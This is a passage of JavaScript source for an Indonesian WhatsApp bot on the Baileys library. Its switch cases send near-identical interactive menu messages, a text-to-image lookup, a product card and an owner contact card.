                            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fetch('https://telegra.ph/file/b29e8a8622646929be26d.jpg')}, { upload: alifatah.waUploadToServer })) 
                                }), 
                          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                            buttons: [ 
                             { 
                                "name": "quick_reply",
                                "buttonParamsJson":  "{\"display_text\":\"Back\",\"id\":\".menu\"}"
                              },
                              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube\",\"url\":\"https://www.youtube.com/@Fauzialifatah\",\"merchant_url\":\"https://www.youtube.com/@Fauzialifatah\"}"
              },
                               
           ],
          })
        })
    }
  }
}, {})
 alifatah.relayMessage(m.key.remoteJid, msgpvi.message, {
  messageId: m.key.id
})
break

case 'animemenu':
if (!isRegistered) return reply('Kamu belum daftar! Silahkan daftar dengan cara .daftar fauzialifatah!')
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
await loading()
wynim = `
*Hi @${sender.split("@")[0]} 👋*
[ 🇬🇧 ] Hello, I am a WhatsApp bot built by a script developer, I am here to help you in finding various things you need via WhatsApp messenger, good luck trying

${animemen()}`
let msginmen = generateWAMessageFromContent(m.chat, { 
                  viewOnceMessage: { 
                    message: { 
                        "messageContextInfo": { 
                          "deviceListMetadata": {}, 
                          "deviceListMetadataVersion": 2 
                        }, 
                        interactiveMessage: proto.Message.InteractiveMessage.create({ 
                            contextInfo: { 
                                mentionedJid: null, 
                                isForwarded: true, 
                                forwardedNewsletterMessageInfo: { 
                                    newsletterJid: 'bjir@newsletter', 
                                    newsletterName: 'Script WhatsApp V5', 
                                    serverMessageId: -1 
                                }, 
                                businessMessageForwardInfo: { 
                                    businessOwnerJid: "0@s.whatsapp.net" 
                                }, 
                                
                            }, 
                          body: proto.Message.InteractiveMessage.Body.create({ 
                            text: wynim
                          }), 
                          footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: Styles (`Fauzialifatah - MD`)
                          }), 
                          header: proto.Message.InteractiveMessage.Header.create({ 
                            title: "", 
                            subtitle: "--", 
                            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fetch('https://telegra.ph/file/b29e8a8622646929be26d.jpg')}, { upload: alifatah.waUploadToServer })) 
                                }), 
                          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                            buttons: [ 
                             { 
                                "name": "quick_reply",
                                "buttonParamsJson":  "{\"display_text\":\"Back\",\"id\":\".menu\"}"
                              },
                              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube\",\"url\":\"https://www.youtube.com/@Fauzialifatah\",\"merchant_url\":\"https://www.youtube.com/@Fauzialifatah\"}"
              },
                               
           ],
          })
        })
    }
  }
}, {})
 alifatah.relayMessage(m.key.remoteJid, msginmen.message, {
  messageId: m.key.id
})
break

case 'panelmenu':
if (!isRegistered) return reply('Kamu belum daftar! Silahkan daftar dengan cara .daftar fauzialifatah!')
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
await loading()
wyl = `
*Hi @${sender.split("@")[0]} 👋*
[ 🇬🇧 ] Hello, I am a WhatsApp bot built by a script developer, I am here to help you in finding various things you need via WhatsApp messenger, good luck trying

${crpanel()}`
let msgcvi = generateWAMessageFromContent(m.chat, { 
                  viewOnceMessage: { 
                    message: { 
                        "messageContextInfo": { 
                          "deviceListMetadata": {}, 
                          "deviceListMetadataVersion": 2 
                        }, 
                        interactiveMessage: proto.Message.InteractiveMessage.create({ 
                            contextInfo: { 
                                mentionedJid: null, 
                                isForwarded: true, 
                                forwardedNewsletterMessageInfo: { 
                                    newsletterJid: 'bjir@newsletter', 
                                    newsletterName: 'Script WhatsApp V5', 
                                    serverMessageId: -1 
                                }, 
                                businessMessageForwardInfo: { 
                                    businessOwnerJid: "0@s.whatsapp.net" 
                                }, 
                                
                            }, 
                          body: proto.Message.InteractiveMessage.Body.create({ 
                            text: wyl
                          }), 
                          footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: Styles (`Fauzialifatah - MD`)
                          }), 
                          header: proto.Message.InteractiveMessage.Header.create({ 
                            title: "", 
                            subtitle: "--", 
                            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fetch('https://telegra.ph/file/b29e8a8622646929be26d.jpg')}, { upload: alifatah.waUploadToServer })) 
                                }), 
                          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                            buttons: [ 
                             { 
                                "name": "quick_reply",
                                "buttonParamsJson":  "{\"display_text\":\"Back\",\"id\":\".menu\"}"
                              },
                              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube\",\"url\":\"https://www.youtube.com/@Fauzialifatah\",\"merchant_url\":\"https://www.youtube.com/@Fauzialifatah\"}"
              },
                               
           ],
          })
        })
    }
  }
}, {})
 alifatah.relayMessage(m.key.remoteJid, msgcvi.message, {
  messageId: m.key.id
})
break

case 'videomenu':
if (!isRegistered) return reply('Kamu belum daftar! Silahkan daftar dengan cara .daftar fauzialifatah!')
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
await loading()
wfl = `
*Hi @${sender.split("@")[0]} 👋*
[ 🇬🇧 ] Hello, I am a WhatsApp bot built by a script developer, I am here to help you in finding various things you need via WhatsApp messenger, good luck trying

${flamingli()}`
let msgivi = generateWAMessageFromContent(m.chat, { 
                  viewOnceMessage: { 
                    message: { 
                        "messageContextInfo": { 
                          "deviceListMetadata": {}, 
                          "deviceListMetadataVersion": 2 
                        }, 
                        interactiveMessage: proto.Message.InteractiveMessage.create({ 
                            contextInfo: { 
                                mentionedJid: null, 
                                isForwarded: true, 
                                forwardedNewsletterMessageInfo: { 
                                    newsletterJid: 'bjir@newsletter', 
                                    newsletterName: 'Script WhatsApp V5', 
                                    serverMessageId: -1 
                                }, 
                                businessMessageForwardInfo: { 
                                    businessOwnerJid: "0@s.whatsapp.net" 
                                }, 
                                
                            }, 
                          body: proto.Message.InteractiveMessage.Body.create({ 
                            text: wfl
                          }), 
                          footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: Styles (`Fauzialifatah - MD`)
                          }), 
                          header: proto.Message.InteractiveMessage.Header.create({ 
                            title: "", 
                            subtitle: "--", 
                            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fetch('https://telegra.ph/file/b29e8a8622646929be26d.jpg')}, { upload: alifatah.waUploadToServer })) 
                                }), 
                          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                            buttons: [ 
                             { 
                                "name": "quick_reply",
                                "buttonParamsJson":  "{\"display_text\":\"Back\",\"id\":\".menu\"}"
                              },
                              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube\",\"url\":\"https://www.youtube.com/@Fauzialifatah\",\"merchant_url\":\"https://www.youtube.com/@Fauzialifatah\"}"
              },
                               
           ],
          })
        })
    }
  }
}, {})
 alifatah.relayMessage(m.key.remoteJid, msgivi.message, {
  messageId: m.key.id
})
break

case 'videomenu':
if (!isRegistered) return reply('Kamu belum daftar! Silahkan daftar dengan cara .daftar fauzialifatah!')
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
await loading()
wfc = `
*Hi @${sender.split("@")[0]} 👋*
[ 🇬🇧 ] Hello, I am a WhatsApp bot built by a script developer, I am here to help you in finding various things you need via WhatsApp messenger, good luck trying

${vidrdm()}`
let msgici = generateWAMessageFromContent(m.chat, { 
                  viewOnceMessage: { 
                    message: { 
                        "messageContextInfo": { 
                          "deviceListMetadata": {}, 
                          "deviceListMetadataVersion": 2 
                        }, 
                        interactiveMessage: proto.Message.InteractiveMessage.create({ 
                            contextInfo: { 
                                mentionedJid: null, 
                                isForwarded: true, 
                                forwardedNewsletterMessageInfo: { 
                                    newsletterJid: 'bjir@newsletter', 
                                    newsletterName: 'Script WhatsApp V5', 
                                    serverMessageId: -1 
                                }, 
                                businessMessageForwardInfo: { 
                                    businessOwnerJid: "0@s.whatsapp.net" 
                                }, 
                                
                            }, 
                          body: proto.Message.InteractiveMessage.Body.create({ 
                            text: wfc
                          }), 
                          footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: Styles (`Fauzialifatah - MD`)
                          }), 
                          header: proto.Message.InteractiveMessage.Header.create({ 
                            title: "", 
                            subtitle: "--", 
                            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fetch('https://telegra.ph/file/b29e8a8622646929be26d.jpg')}, { upload: alifatah.waUploadToServer })) 
                                }), 
                          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                            buttons: [ 
                             { 
                                "name": "quick_reply",
                                "buttonParamsJson":  "{\"display_text\":\"Back\",\"id\":\".menu\"}"
                              },
                              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube\",\"url\":\"https://www.youtube.com/@Fauzialifatah\",\"merchant_url\":\"https://www.youtube.com/@Fauzialifatah\"}"
              },
                               
           ],
          })
        })
    }
  }
}, {})
 alifatah.relayMessage(m.key.remoteJid, msgici.message, {
  messageId: m.key.id
})
break

case 'imagemenu':
if (!isRegistered) return reply('Kamu belum daftar! Silahkan daftar dengan cara .daftar fauzialifatah!')
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
await loading()
wic = `
*Hi @${sender.split("@")[0]} 👋*
[ 🇬🇧 ] Hello, I am a WhatsApp bot built by a script developer, I am here to help you in finding various things you need via WhatsApp messenger, good luck trying

${imgrdm()}`
let msgizi = generateWAMessageFromContent(m.chat, { 
                  viewOnceMessage: { 
                    message: { 
                        "messageContextInfo": { 
                          "deviceListMetadata": {}, 
                          "deviceListMetadataVersion": 2 
                        }, 
                        interactiveMessage: proto.Message.InteractiveMessage.create({ 
                            contextInfo: { 
                                mentionedJid: null, 
                                isForwarded: true, 
                                forwardedNewsletterMessageInfo: { 
                                    newsletterJid: 'bjir@newsletter', 
                                    newsletterName: 'Script WhatsApp V5', 
                                    serverMessageId: -1 
                                }, 
                                businessMessageForwardInfo: { 
                                    businessOwnerJid: "0@s.whatsapp.net" 
                                }, 
                                
                            }, 
                          body: proto.Message.InteractiveMessage.Body.create({ 
                            text: wic
                          }), 
                          footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: Styles (`Fauzialifatah - MD`)
                          }), 
                          header: proto.Message.InteractiveMessage.Header.create({ 
                            title: "", 
                            subtitle: "--", 
                            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fetch('https://telegra.ph/file/b29e8a8622646929be26d.jpg')}, { upload: alifatah.waUploadToServer })) 
                                }), 
                          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                            buttons: [ 
                             { 
                                "name": "quick_reply",
                                "buttonParamsJson":  "{\"display_text\":\"Back\",\"id\":\".menu\"}"
                              },
                              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube\",\"url\":\"https://www.youtube.com/@Fauzialifatah\",\"merchant_url\":\"https://www.youtube.com/@Fauzialifatah\"}"
              },
                               
           ],
          })
        })
    }
  }
}, {})
 alifatah.relayMessage(m.key.remoteJid, msgizi.message, {
  messageId: m.key.id
})
break

case 'text2img': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
  if (!text) return reply(`Example: ${prefix + command} Cat`)
  // Check if the version is between 1 and 7
  const versionRegex = /^v[1-7]$/;
  if (args[0] && versionRegex.test(args[0])) {
    reply(mess.wait)
    let cap = `${mess.success}`
    let imgg;

    switch (args[0]) {
      case 'v1':
        imgg = `https://aemt.me/ai/text2img?text=${text}`;
        break;
      case 'v2':
        imgg = `https://aemt.me/v1/text2img?text=${text}`;
        break;
      case 'v3':
        imgg = `https://aemt.me/v2/text2img?text=${text}`;
        break;
      case 'v4':
        imgg = `https://aemt.me/v3/text2img?text=${text}`;
        break;
      case 'v5':
        imgg = `https://aemt.me/v4/text2img?text=${text}`;
        break;
      case 'v6':
        imgg = `https://aemt.me/v5/text2img?text=${text}`;
        break;
      case 'v7':
        imgg = `https://aemt.me/v6/text2img?text=${text}`;
        break;
    }

    alifatah.sendMessage(m.chat, { image: { url: imgg }, caption: cap }, { quoted:fcall });
    return;
  }

  let sections = [
    {
      title: 'Text To Image',
      rows: [
        { title: 'Version 1', description: `Text To Image Version 1`, id: `${prefix}text2img v1 ${text}` },
        { title: 'Version 2', description: `Text To Image Version 2`, id: `${prefix}text2img v2 ${text}` },
        { title: 'Version 3', description: `Text To Image Version 3`, id: `${prefix}text2img v3 ${text}` },
        { title: 'Version 4', description: `Text To Image Version 4`, id: `${prefix}text2img v4 ${text}` },
        { title: 'Version 5', description: `Text To Image Version 5`, id: `${prefix}text2img v5 ${text}` },
        { title: 'Version 6', description: `Text To Image Version 6`, id: `${prefix}text2img v6 ${text}` },
        { title: 'Version 7', description: `Text To Image Version 7`, id: `${prefix}text2img v7 ${text}` },
      ]
    }
  ];

  let listMessage = {
    title: 'List Menu',
    sections
  };

  let msg = generateWAMessageFromContent(from, {
    viewOnceMessage: {
      message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Silahkan pilih *option* di bawah ini`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: packname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: ``,
            gifPlayback: true,
            subtitle: namaown,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": JSON.stringify(listMessage)
              }
            ],
          }),
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterName: '',
              newsletterJid: 'bjir@newsletter',
              serverMessageId: 143
            }
          }
        })
      }
    }
  }, {});

  await alifatah.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
  });
}
break

case 'primbomenu':
if (!isRegistered) return reply('Kamu belum daftar! Silahkan daftar dengan cara .daftar fauzialifatah!')
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
await loading()
wok = `
*Hi @${sender.split("@")[0]} 👋*
[ 🇬🇧 ] Hello, I am a WhatsApp bot built by a script developer, I am here to help you in finding various things you need via WhatsApp messenger, good luck trying

${primek()}`
let msgiai = generateWAMessageFromContent(m.chat, { 
                  viewOnceMessage: { 
                    message: { 
                        "messageContextInfo": { 
                          "deviceListMetadata": {}, 
                          "deviceListMetadataVersion": 2 
                        }, 
                        interactiveMessage: proto.Message.InteractiveMessage.create({ 
                            contextInfo: { 
                                mentionedJid: null, 
                                isForwarded: true, 
                                forwardedNewsletterMessageInfo: { 
                                    newsletterJid: 'bjir@newsletter', 
                                    newsletterName: 'Script WhatsApp V5', 
                                    serverMessageId: -1 
                                }, 
                                businessMessageForwardInfo: { 
                                    businessOwnerJid: "0@s.whatsapp.net" 
                                }, 
                                
                            }, 
                          body: proto.Message.InteractiveMessage.Body.create({ 
                            text: wok
                          }), 
                          footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: Styles (`Fauzialifatah - MD`)
                          }), 
                          header: proto.Message.InteractiveMessage.Header.create({ 
                            title: "", 
                            subtitle: "--", 
                            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fetch('https://telegra.ph/file/b29e8a8622646929be26d.jpg')}, { upload: alifatah.waUploadToServer })) 
                                }), 
                          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                            buttons: [ 
                             { 
                                "name": "quick_reply",
                                "buttonParamsJson":  "{\"display_text\":\"Back\",\"id\":\".menu\"}"
                              },
                              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube\",\"url\":\"https://www.youtube.com/@Fauzialifatah\",\"merchant_url\":\"https://www.youtube.com/@Fauzialifatah\"}"
              },
                               
           ],
          })
        })
    }
  }
}, {})
 alifatah.relayMessage(m.key.remoteJid, msgiai.message, {
  messageId: m.key.id
})
break

case 'groupmenu':
if (!isRegistered) return reply('Kamu belum daftar! Silahkan daftar dengan cara .daftar fauzialifatah!')
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
await loading()
wpk = `
*Hi @${sender.split("@")[0]} 👋*
[ 🇬🇧 ] Hello, I am a WhatsApp bot built by a script developer, I am here to help you in finding various things you need via WhatsApp messenger, good luck trying

${groupstack()}`
let msgiii = generateWAMessageFromContent(m.chat, { 
                  viewOnceMessage: { 
                    message: { 
                        "messageContextInfo": { 
                          "deviceListMetadata": {}, 
                          "deviceListMetadataVersion": 2 
                        }, 
                        interactiveMessage: proto.Message.InteractiveMessage.create({ 
                            contextInfo: { 
                                mentionedJid: null, 
                                isForwarded: true, 
                                forwardedNewsletterMessageInfo: { 
                                    newsletterJid: 'bjir@newsletter', 
                                    newsletterName: 'Script WhatsApp V5', 
                                    serverMessageId: -1 
                                }, 
                                businessMessageForwardInfo: { 
                                    businessOwnerJid: "0@s.whatsapp.net" 
                                }, 
                                
                            }, 
                          body: proto.Message.InteractiveMessage.Body.create({ 
                            text: wpk
                          }), 
                          footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: Styles (`Fauzialifatah - MD`)
                          }), 
                          header: proto.Message.InteractiveMessage.Header.create({ 
                            title: "", 
                            subtitle: "--", 
                            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fetch('https://telegra.ph/file/b29e8a8622646929be26d.jpg')}, { upload: alifatah.waUploadToServer })) 
                                }), 
                          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                            buttons: [ 
                             { 
                                "name": "quick_reply",
                                "buttonParamsJson":  "{\"display_text\":\"Back\",\"id\":\".menu\"}"
                              },
                              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube\",\"url\":\"https://www.youtube.com/@Fauzialifatah\",\"merchant_url\":\"https://www.youtube.com/@Fauzialifatah\"}"
              },
                               
           ],
          })
        })
    }
  }
}, {})
 alifatah.relayMessage(m.key.remoteJid, msgiii.message, {
  messageId: m.key.id
})
break

case 'testimenu':
if (!isRegistered) return reply('Kamu belum daftar! Silahkan daftar dengan cara .daftar fauzialifatah!')
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
await loading()
wok = `
*Hi @${sender.split("@")[0]} 👋*
[ 🇬🇧 ] Hello, I am a WhatsApp bot built by a script developer, I am here to help you in finding various things you need via WhatsApp messenger, good luck trying

${testimoni()}`
let msgip = generateWAMessageFromContent(m.chat, { 
                  viewOnceMessage: { 
                    message: { 
                        "messageContextInfo": { 
                          "deviceListMetadata": {}, 
                          "deviceListMetadataVersion": 2 
                        }, 
                        interactiveMessage: proto.Message.InteractiveMessage.create({ 
                            contextInfo: { 
                                mentionedJid: null, 
                                isForwarded: true, 
                                forwardedNewsletterMessageInfo: { 
                                    newsletterJid: 'bjir@newsletter', 
                                    newsletterName: 'Script WhatsApp V5', 
                                    serverMessageId: -1 
                                }, 
                                businessMessageForwardInfo: { 
                                    businessOwnerJid: "0@s.whatsapp.net" 
                                }, 
                                
                            }, 
                          body: proto.Message.InteractiveMessage.Body.create({ 
                            text: wok
                          }), 
                          footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: Styles (`Fauzialifatah - MD`)
                          }), 
                          header: proto.Message.InteractiveMessage.Header.create({ 
                            title: "", 
                            subtitle: "--", 
                            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fetch('https://telegra.ph/file/b29e8a8622646929be26d.jpg')}, { upload: alifatah.waUploadToServer })) 
                                }), 
                          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                            buttons: [ 
                             { 
                                "name": "quick_reply",
                                "buttonParamsJson":  "{\"display_text\":\"Back\",\"id\":\".menu\"}"
                              },
                              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube\",\"url\":\"https://www.youtube.com/@Fauzialifatah\",\"merchant_url\":\"https://www.youtube.com/@Fauzialifatah\"}"
              },
                               
           ],
          })
        })
    }
  }
}, {})
 alifatah.relayMessage(m.key.remoteJid, msgip.message, {
  messageId: m.key.id
})
break

case 'unbannedmenu':
if (!isRegistered) return reply('Kamu belum daftar! Silahkan daftar dengan cara .daftar fauzialifatah!')
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
await loading()
wkk = `
*Hi @${sender.split("@")[0]} 👋*
[ 🇬🇧 ] Hello, I am a WhatsApp bot built by a script developer, I am here to help you in finding various things you need via WhatsApp messenger, good luck trying

${unbanned()}`
let msgiw = generateWAMessageFromContent(m.chat, { 
                  viewOnceMessage: { 
                    message: { 
                        "messageContextInfo": { 
                          "deviceListMetadata": {}, 
                          "deviceListMetadataVersion": 2 
                        }, 
                        interactiveMessage: proto.Message.InteractiveMessage.create({ 
                            contextInfo: { 
                                mentionedJid: null, 
                                isForwarded: true, 
                                forwardedNewsletterMessageInfo: { 
                                    newsletterJid: 'bjir@newsletter', 
                                    newsletterName: 'Script WhatsApp V5', 
                                    serverMessageId: -1 
                                }, 
                                businessMessageForwardInfo: { 
                                    businessOwnerJid: "0@s.whatsapp.net" 
                                }, 
                                
                            }, 
                          body: proto.Message.InteractiveMessage.Body.create({ 
                            text: wkk
                          }), 
                          footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: Styles (`Fauzialifatah - MD`)
                          }), 
                          header: proto.Message.InteractiveMessage.Header.create({ 
                            title: "", 
                            subtitle: "--", 
                            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fetch('https://telegra.ph/file/b29e8a8622646929be26d.jpg')}, { upload: alifatah.waUploadToServer })) 
                                }), 
                          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                            buttons: [ 
                             { 
                                "name": "quick_reply",
                                "buttonParamsJson":  "{\"display_text\":\"Back\",\"id\":\".menu\"}"
                              },
                              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube\",\"url\":\"https://www.youtube.com/@Fauzialifatah\",\"merchant_url\":\"https://www.youtube.com/@Fauzialifatah\"}"
              },
                               
           ],
          })
        })
    }
  }
}, {})
 alifatah.relayMessage(m.key.remoteJid, msgiw.message, {
  messageId: m.key.id
})
break

case 'quotesmenu':
if (!isRegistered) return reply('Kamu belum daftar! Silahkan daftar dengan cara .daftar fauzialifatah!')
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
await loading()
wwk = `
*Hi @${sender.split("@")[0]} 👋*
[ 🇬🇧 ] Hello, I am a WhatsApp bot built by a script developer, I am here to help you in finding various things you need via WhatsApp messenger, good luck trying

${qoutedmen()}`
let msgil = generateWAMessageFromContent(m.chat, { 
                  viewOnceMessage: { 
                    message: { 
                        "messageContextInfo": { 
                          "deviceListMetadata": {}, 
                          "deviceListMetadataVersion": 2 
                        }, 
                        interactiveMessage: proto.Message.InteractiveMessage.create({ 
                            contextInfo: { 
                                mentionedJid: null, 
                                isForwarded: true, 
                                forwardedNewsletterMessageInfo: { 
                                    newsletterJid: 'bjir@newsletter', 
                                    newsletterName: 'Script WhatsApp V5', 
                                    serverMessageId: -1 
                                }, 
                                businessMessageForwardInfo: { 
                                    businessOwnerJid: "0@s.whatsapp.net" 
                                }, 
                                
                            }, 
                          body: proto.Message.InteractiveMessage.Body.create({ 
                            text: wwk
                          }), 
                          footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: Styles (`Fauzialifatah - MD`)
                          }), 
                          header: proto.Message.InteractiveMessage.Header.create({ 
                            title: "", 
                            subtitle: "--", 
                            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fetch('https://telegra.ph/file/b29e8a8622646929be26d.jpg')}, { upload: alifatah.waUploadToServer })) 
                                }), 
                          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                            buttons: [ 
                             { 
                                "name": "quick_reply",
                                "buttonParamsJson":  "{\"display_text\":\"Back\",\"id\":\".menu\"}"
                              },
                              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube\",\"url\":\"https://www.youtube.com/@Fauzialifatah\",\"merchant_url\":\"https://www.youtube.com/@Fauzialifatah\"}"
              },
                               
           ],
          })
        })
    }
  }
}, {})
 alifatah.relayMessage(m.key.remoteJid, msgil.message, {
  messageId: m.key.id
})
break

case 'internetmenu':
if (!isRegistered) return reply('Kamu belum daftar! Silahkan daftar dengan cara .daftar fauzialifatah!')
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
await loading()
wlk = `
*Hi @${sender.split("@")[0]} 👋*
[ 🇬🇧 ] Hello, I am a WhatsApp bot built by a script developer, I am here to help you in finding various things you need via WhatsApp messenger, good luck trying

${inter()}`
let msgal = generateWAMessageFromContent(m.chat, { 
                  viewOnceMessage: { 
                    message: { 
                        "messageContextInfo": { 
                          "deviceListMetadata": {}, 
                          "deviceListMetadataVersion": 2 
                        }, 
                        interactiveMessage: proto.Message.InteractiveMessage.create({ 
                            contextInfo: { 
                                mentionedJid: null, 
                                isForwarded: true, 
                                forwardedNewsletterMessageInfo: { 
                                    newsletterJid: 'bjir@newsletter', 
                                    newsletterName: 'Script WhatsApp V5', 
                                    serverMessageId: -1 
                                }, 
                                businessMessageForwardInfo: { 
                                    businessOwnerJid: "0@s.whatsapp.net" 
                                }, 
                                
                            }, 
                          body: proto.Message.InteractiveMessage.Body.create({ 
                            text: wlk
                          }), 
                          footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: Styles (`Fauzialifatah - MD`)
                          }), 
                          header: proto.Message.InteractiveMessage.Header.create({ 
                            title: "", 
                            subtitle: "--", 
                            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fetch('https://telegra.ph/file/b29e8a8622646929be26d.jpg')}, { upload: alifatah.waUploadToServer })) 
                                }), 
                          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                            buttons: [ 
                             { 
                                "name": "quick_reply",
                                "buttonParamsJson":  "{\"display_text\":\"Back\",\"id\":\".menu\"}"
                              },
                              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube\",\"url\":\"https://www.youtube.com/@Fauzialifatah\",\"merchant_url\":\"https://www.youtube.com/@Fauzialifatah\"}"
              },
                               
           ],
          })
        })
    }
  }
}, {})
 alifatah.relayMessage(m.key.remoteJid, msgal.message, {
  messageId: m.key.id
})
break*/

      case 'alifatah':
        const uploadFile = { upload: alifatah.waUploadToServer };
        var imageMessage = await prepareWAMessageMedia(
          {
            image: { url: `https://telegra.ph/file/b29e8a8622646929be26d.jpg` },
          },
          uploadFile,
        );
        const product = {
          productImage: imageMessage.imageMessage,
          productId: "8118443944856567",
          title: "SC ALIFATAH-MD V5",
          description: "Mau Nyari Apa Bang?",
          currencyCode: "IDR",
          priceAmount1000: "40000000",
          productImageCount: 1,
        };
        const productData = {
          product: product,
          businessOwnerJid: global.owner+"@s.whatsapp.net",
        };
        const productMessage = { productMessage: productData };
        var response = await generateWAMessageFromContent(
          m.chat,
          proto.Message.fromObject(productMessage),
          m.quoted && m.quoted.fromMe
            ? { contextInfo: { ...m.msg.contextInfo } }
            : { quoted:fcall },
        );
        await alifatah.relayMessage(m.chat, response.message, {
          messageId: response.key.id,
        })
        break;
case 'owner': {
const kontak = {
"displayName": 'Owner',
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${global.namaown}\nitem1.TEL;waid=${global.owner}:${global.owner}\nitem1.X>ABLabel:\nPlease Don't Spam My Owner\nURL;Email Owner:${global.namaown}@gmail.com\nORG: INI OWNER\nEND:VCARD`
}
await alifatah.sendMessage(from, {
contacts: { contacts: [kontak] },
contextInfo:{ forwardingScore: 999, isForwarded: false, mentionedJid:[sender],
"externalAdReply":{
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": Styles(`${global.namaown}`), 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnailUrl": ``,
"mediaUrl": `https://telegra.ph/file/b29e8a8622646929be26d.jpg`,
"sourceUrl": `https://whatsapp.com/channel/0029VaUyRQCLdQeWJXvTRg3T`
}}}, { quoted:fcall })
}
break
//=======================================\\
//GAK USAH DI APA APA IN, TERKECUALI UBAH FOTO
/*case 'addpanel': {
if (!isRegistered) return reply('Kamu belum daftar! Silahkan daftar dengan cara #daftar nama|umur!')
if (cekSaldo(m.sender,db_saldo) < 5000) return alifatah.sendMessage(m.chat, { text: `Maaf *@${m.sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp5.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [m.sender]}, { quoted:fcall })
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(m.sender, 5000, db_saldo)
let username2 = t[0];
let u2 = t[1];

let sections = [{
title: `ʟɪꜱᴛ ᴍᴇɴᴜ ${global.namabot}`,
highlight_label: 'Recomended',
rows: [{
title: 'Unli',
